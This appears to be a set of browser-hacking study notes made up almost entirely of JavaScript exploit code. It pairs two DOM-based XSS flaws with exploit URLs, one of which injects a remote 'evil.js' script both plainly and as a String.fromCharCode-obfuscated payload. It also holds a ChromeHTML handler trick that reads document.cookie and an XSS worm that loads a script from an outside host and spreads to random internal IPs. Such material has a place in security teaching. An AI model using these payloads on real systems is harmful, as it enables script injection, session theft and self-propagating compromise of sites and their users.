////////////////////////////////////////////////

// vulnerability #1
document.write(document.location.href.substr(document.location.href.search(/#welcomemessage/i)+16,document.location.href.length))

// exploit #1
http://browservictim.com/homepage.html#welcomemessage=<script>document.location='http://browserhacker.com'</script>

// vulnerability #2
function getId(id){
console.log('id: ' + id);
}

var url = window.location.href;
var pos = url.indexOf("id=")+3;
var len = url.length;
var id = url.substring(pos,len);
eval('getId(' + id.toString() + ')');

// exploit #2
// Without encoding, this wont work because of the single quotes

// Without encoding:
http://browserhacker.com/page.html?id=1');s=document.createElement('script');s.src='http://attacker/evil.js';document.getElementsByTagName('head')[0].appendChild(s);//

// With encoding:
// We obfuscate the single quotes with a character encoding sequence.
http://browserhacker.com/page.html?id=1');eval(String.fromCharCode(115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,47,101,118,105,108,46,106,115,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))//

-----------------------------------------------------------

var sneaky = 'setTimeout("alert(document.cookie);", 4000); 

document.location.assign("http://www.gmail.com");';
document.location = 'chromehtml:"80%20javascript:document.write(sneaky)"';

In this ChromeHTML URL handler exploit, this would set the current location to a Chrome frame, with a timeout that would execute after Gmail had been loaded.
--------------------------
Xss Worm in the infected origin
  <iframe name="iframex" id="iframex" src="hidden" style="display:none">
</iframe>
<script SRC="http://browserhacker.com/xssv.js"></script>


XSS worm JS
  This tries to compromise other web applications

function loadIframe(iframeName, url) {
    if ( window.frames[iframeName] ) {
        window.frames[iframeName].location = url;
        return false;
    }else{
        return true;
    }
}

function do_request() {
    var ip = get_random_ip();
    var exploit_string = '<iframe name="iframe2" id="iframe2" ' +
        'src="hidden" style="display:none"></iframe> ' +
        '<script SRC="http://browserhacker.com/xssv.js"></script>';

    loadIframe('iframe2',"http://" + ip + "/index.php?param=" + exploit_string);
 }

function get_random(){
    var ranNum= Math.round(Math.random()*255);
    return ranNum;
}

function get_random_ip(){
    return "10.0.0."+get_random();
}

setInterval("do_request()", 10000);